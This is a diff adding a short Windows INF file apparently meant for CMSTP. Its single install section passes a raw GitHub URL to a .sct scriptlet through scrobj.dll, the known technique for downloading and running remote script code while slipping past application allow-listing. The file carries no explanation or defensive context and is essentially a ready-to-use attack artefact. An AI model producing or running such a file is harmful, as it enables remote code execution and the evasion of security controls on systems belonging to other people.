@@ -1,0 +1,14 @@
+[version]
+Signature=$Protivti$
+AdvancedINF=2.5
+
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
+
+[UnRegisterOCXSection]
+%11%\scrobj.dll,NI,https://raw.githubusercontent.com/CryoBot/CMSTP/master/CMSTP.sct
+
+[Strings]
+AppAct = "SOFTWARE\Microsoft\Connection Manager"
+ServiceName="Protiviti"
+ShortSvcName="Protiviti"
